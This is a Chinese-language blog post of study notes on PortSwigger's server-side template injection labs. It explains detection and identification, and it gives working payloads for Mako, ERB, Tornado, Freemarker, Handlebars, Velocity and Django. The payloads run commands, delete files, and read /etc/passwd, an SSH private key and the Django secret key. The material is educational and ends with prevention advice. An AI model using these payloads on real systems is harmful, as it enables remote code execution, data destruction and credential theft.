---
layout: article
title: WSAcademy 17 -- SSTI
mathjax: true
key: a00028
cover: /bkgs/1.png
modify_date: 2021-10-20
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- SSTI
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的SSTI部分<!--more-->

原文：[Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)

## What is SSTI？

server-side template injection 使用本机模板语法将恶意负载注入模板，然后在服务器端执行。

模板引擎旨在通过将固定模板与易失性数据相结合来生成网页

当**用户输入直接连接到模板中**，而不是作为数据传入时，可能会发生服务器端模板注入攻击。这使得攻击者能够注入任意模板指令以操纵模板引擎，通常使他们能够完全控制服务器

## impact 

- remote code execution
- perform other attacks on internal infrastructure.
- gaining read access to sensitive data and arbitrary files on the server.

## How do server-side template injection vulnerabilities arise?

当用户输入连接到模板中而不是作为数据传入时。

（类似于SQLi）

仅提供用于呈现动态内容的占位符的静态模板通常不会受到服务器端模板注入的攻击

`$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );`

customize one：

`$output = $twig->render("Dear " . $_GET['name']);`

attacker could ：

`http://vulnerable-website.com/?name={{bad-stuff-here}}`

一些网站故意允许某些特权用户（如内容编辑器）编辑或提交自定义模板

## Constructing a server-side template injection attack

a successful attack typically involves the following high-level process.

![4](/pics/WSA/4.jpg)

### Detect

与任何漏洞一样，利用漏洞的第一步是能够找到它。

通过注入模板表达式中常用的**特殊字符序列**来fuzz模板，例如`${{<%[%'“}}}%\`

如果**引发异常**，这表示服务器可能正在以**某种方式解释注入的模板语法**

无论您的fuzzing的结果如何，尝试以下特定于上下文的方法也很重要。如果fuzzing结果不确定，则漏洞仍可能使用这些方法之一暴露出来。即使fuzzing确实表明存在模板注入漏洞，您仍然需要识别其上下文以利用它。

#### Plaintext context

大多数模板语言允许您通过直接使用HTML标记或使用模板的原生语法自由输入内容，在发送HTTP响应之前将在后端呈现为HTML

这有时可用于XSS

但是，通过将**数学运算设置为参数值**，我们可以测试这是否也是服务器端模板注入攻击的潜在入口点。

For example

`render('Hello ' + username)`

test this

`http://vulnerable-website.com/?username=${7*7}`

#### Code context

In other cases, the vulnerability is exposed by user input being placed within a template expression

such as:

```
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)

http://vulnerable-website.com/?greeting=data.username<tag>
```

在没有XSS的情况下，这通常会导致输出中出现一个空白条目（没有用户名的Hello）、编码的标记或错误消息

下一步是尝试使用通用模板语法中断语句，并尝试在语句之后插入任意HTML：

```
http://vulnerable-website.com/?greeting=data.username}}<tag>
```

如果这再次导致错误或空白输出，则说明您使用了错误模板语言的语法，或者，如果没有任何模板样式语法有效，则无法进行服务器端模板注入

如果**输出与任意HTML一起正确呈现**，则这是服务器端模板注入的关键指示

```
Hello Carlos<tag>
```

### Identify

一旦检测到潜在的模板注入，下一步就是识别模板引擎。

一般提交**无效语法**就足够了，因为生成的错误消息将准确地告诉您模板引擎是什么，有时甚至有版本信息

否则，您将需要手动测试不同语言特定的有效负载，并研究模板引擎如何解释它们

一种常见的方法是使用来自不同模板引擎的语法注入任意数学运算

要帮助完成此过程，您可以使用类似于以下内容的决策树：

![5](/pics/WSA/5.jpg)

您应该知道，同一负载有时可以返回多个模板语言的成功响应。例如，有效负载

```
{{7*'7'}}
```

在Twig中返回49，在Jinja2中返回777。因此，重要的是不要根据一个成功的回答就得出结论。

### Exploit

一旦发现服务器端模板注入漏洞并识别正在使用的模板引擎，成功利用该漏洞通常涉及以下过程。

- Read

- - Template syntax
  - Security documentation
  - Documented exploits

- Explore the environment
- Create a custom attack

### Read

除非您已经对模板引擎了如指掌，否则通常首先要**阅读其文档**。

#### Learn the basic template syntax

学习基本语法以及关键函数和变量处理显然很重要

例如，一旦您知道正在使用基于Python的Mako模板引擎，实现远程代码执行可以非常简单：

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

```python
lab1：
RUBY ERB template
<%= 7*7 %>
<%= system("rm /home/carlos/morale.txt") %>

lab2：
PYTHON Tornado template
blog-post-author-display=user.name } } { % 25+import+os+%25 } { { os.system('rm%20/home/carlos/morale.txt')   （去掉空格）
```

#### Read about the security implications

文档还可能提供某种“安全”部分

本节的名称可能会有所不同，但它通常会概述人们应该避免使用模板进行的所有**潜在危险的操作**

或者至少是文档中的某种**警告**

例如，在ERB中，文档显示您可以列出所有目录，然后读取任意文件，如下所示：

`<%= Dir.entries('/') %>`

`<%= File.open('/example/arbitrary-file').read %>`

```java
lab：
JAVA Freemarker template
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

#### Look for known exploits

一旦您能够识别正在使用的模板引擎，您应该浏览web以查找其他人可能已经发现的任何漏洞

```
lab：

{{#with "s" as |string|}}
	 {{#with "e"}}
		  {{#with split as |conslist|}}
		    {{this.pop}}
		    {{this.push (lookup string.sub "constructor")}}
		    {{this.pop}}
		    {{#with string.split as |codelist|}}
		      {{this.pop}}
		      {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
		      {{this.pop}}
		      {{#each conslist}}
		        {{#with (string.sub.apply 0 codelist)}}
		          {{this}}
		        {{/with}}
		      {{/each}}
		    {{/with}}
		  {{/with}}
		{{/with}}
{{/with}}

		
```

referer：
https://xz.aliyun.com/t/4695?page=1
exploit posted by @Zombiehelp54.

```
		wrtz{{#with "s" as |string|}}
		  {{#with "e"}}
		    {{#with split as |conslist|}}
		      {{this.pop}}
		      {{this.push (lookup string.sub "constructor")}}
		      {{this.pop}}
		      {{#with string.split as |codelist|}}
		        {{this.pop}}
		        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
		        {{this.pop}}
		        {{#each conslist}}
		          {{#with (string.sub.apply 0 codelist)}}
		            {{this}}
		          {{/with}}
		        {{/each}}
		      {{/with}}
		    {{/with}}
		  {{/with}}
		{{/with}}
```

### Explore

此时，您可能已经在文档中偶然发现了一个可行的漏洞。如果没有，下一步是**探索环境并尝试发现您可以访问的所有对象**。

许多模板引擎公开某种类型的**“self”或“environment”对象**，其行为类似于包含模板引擎支持的所有对象、方法和属性的命名空间

例如，在基于Java的模板语言中，有时可以使用以下注入列出环境中的所有变量：

```java
${T(java.lang.System).getenv()}
```

#### Developer-supplied objects

需要注意的是，网站将包含模板提供的内置对象和web开发人员提供的自定义、特定于站点的对象

您应该**特别注意这些非标准对象**，因为它们特别可能包含敏感信息或可利用的方法

	lab：
	Python Django framework
	1. { % debug % }     （去掉空格）
	2. find settings 
	3.{{settings.SECRET_KEY}}
## Create a custom attack

有时，您需要构造一个自定义漏洞。例如，您可能会发现模板引擎在沙箱中执行模板，这可能会使利用变得困难，甚至不可能。

确定攻击面后，如果没有明显的方法利用漏洞，则应**继续使用传统的审计技术**，检查每个函数是否存在可利用的行为

### Constructing a custom exploit using an object chain

如上所述，第一步是**识别您有权访问的对象和方法**

在研究对象文档时，请特别注意这些对象授予访问权限的方法以及它们返回的对象

通过深入查看文档，您可以发现可以**链接在一起的对象**和方法的组合

**将正确的对象和方法链接在一起**有时可以让您访问危险的功能和最初看起来遥不可及的敏感数据。

For example：

Velocity

chain the `$class.inspect()` method and `$class.type` property to obtain references to arbitrary objects

`$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")`

```
lab：??
Freemarker 

Confirm that you can execute ${object.getClass()} using the product object.

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

https://onlineasciitools.com/convert-bytes-to-ascii

```

### Constructing a custom exploit using developer-supplied objects

默认情况下，某些模板引擎在**安全、锁定的环境**中运行，以尽可能降低相关风险

然而，虽然通常为模板内置提供大量文档，但几乎可以肯定的是，**站点特定对象根本没有文档**

```
lab：
upload an invalid  image ， find a method called user.setAvatar()
change name with user.setAvatar('/etc/passwd')
user.setAvatar('/etc/passwd','image/jpg')
GET /avatar?avatar=wiener to see the contents of the /etc/passwd file
user.setAvatar('/home/carlos/User.php','image/jpg')   find the gdprDelete() function 
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
user.gdprDelete()  and view your comment 
```

## How to prevent SSTI

防止服务器端模板注入的最佳方法是**不允许任何用户修改或提交新模板**。

最简单的方法之一是始终使用“无逻辑”模板引擎（如Mustach）

另一个措施是仅在**沙盒环境**中执行用户代码，其中潜在的危险模块和函数已被完全删除。不幸的是，对不受信任的代码进行沙箱处理本身就很困难，而且容易被绕过。

最后，接受任意代码执行几乎是不可避免的，并通过在**锁定的Docker容器中部署模板环境**来应用您自己的沙箱。